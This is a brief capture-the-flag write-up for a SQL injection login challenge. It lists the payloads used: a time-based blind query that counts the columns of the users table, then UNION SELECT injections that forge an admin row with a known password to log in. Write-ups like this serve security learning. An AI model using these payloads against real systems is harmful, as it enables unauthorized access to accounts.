Writeup:

- The hint tells us there is no admin account
- We have to add it ourselves
- We can use the UNION command to add a new row
- First, we need to know how many columns there are
	- ' OR IF((SELECT count(*) FROM information_schema.columns WHERE table_name = 'users') LIKE 4, sleep(5), null) #
- There are 4 columns
- We know three of the columns are username, password, and is_admin
- The fourth is likely ID
- We need to figure out which field is password. ID and username do not matter
	- ' UNION SELECT null, null, null, null #
- We find that the third field is the password field
	- ' UNION SELECT null, null, 'password', null #
	- (Have the password as 'password')
- Now, we need to find out which field is the admin field
	- ' UNION SELEcT null, true, 'password', null #
- The second field is the admin field
- We login as admin and get the flag
